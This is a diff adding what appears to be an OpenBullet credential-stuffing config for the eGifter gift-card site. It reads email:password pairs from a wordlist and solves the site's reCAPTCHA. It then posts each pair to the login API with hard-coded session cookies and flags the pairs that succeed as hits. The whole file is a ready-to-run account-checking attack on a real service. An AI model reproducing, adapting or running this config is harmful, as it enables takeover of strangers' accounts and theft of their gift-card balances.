@@ -1,0 +1,46 @@
+[SETTINGS]
+{
+  "Name": "egifter",
+  "SuggestedBots": 1,
+  "LastModified": "2018-09-21T16:52:37.4067472+00:00",
+  "AdditionalInfo": "",
+  "Author": "sqrt",
+  "Version": "1.0.0",
+  "NeedsProxies": false,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "None",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+[SCRIPT]
+REQUEST GET "https://www.egifter.com/auth/login" AutoRedirect=TRUE 
+  CONTENT "" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+RECAPTCHA "https://www.egifter.com/auth/login" "6LeSAhQTAAAAAODppZ9KF4iPFIxVg8QsyJVz5SQu" -> VAR "RECAPTCHA" 
+REQUEST POST "https://v3-egapi.egifter.com/auth/login" AutoRedirect=TRUE 
+  CONTENT "{\"Email\":\"<USER>\",\"Password\":\"<PASS>\",\"Captcha\":\"<RECAPTCHA>\",\"TOTP\":null}" 
+  CONTENTTYPE "application/json;charset=UTF-8" 
+  COOKIE "cookie: __cfduid=d237f01da39c2fcab2102fb02e19e736e1537548553; koid=1afd1455e158434fad7504f98212bbe5; DG_IID=A779040A-1988-3B24-8333-0C85605A6EAB; DG_UID=2F2D7ED4-F278-31B8-BEB9-B9A6B9C39CD9; DG_ZID=776FB2A1-407B-32F9-8437-83243009D668; DG_ZUID=74CB046B-5BBA-34EF-AA5D-7125DCC7E535; DG_HID=85524482-BFF1-36DB-9029-FEFA5F37DF6C; DG_SID=73.160.113.242:HvHWSvGWPkfjEC4JvnAUnEQD2nQ9TfrDAS0AOeg5LnE; ega-GA=0e7b11c9-c107-4088-988e-59cb58e37f94" 
+  HEADER "Accept: application/json, text/plain, */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "origin: https://www.egifter.com" 
+  HEADER "referer: https://www.egifter.com/auth/login" 
+KEYCHECK BanOn4XX=FALSE BanOnToCheck=TRUE 
+  KEYCHAIN Success OR 
+    KEY "<RESPONSECODE>" Contains "200" 
+  KEYCHAIN Failure OR 
+    KEY "There was an error processing your request. Please try again or contact customer support" 
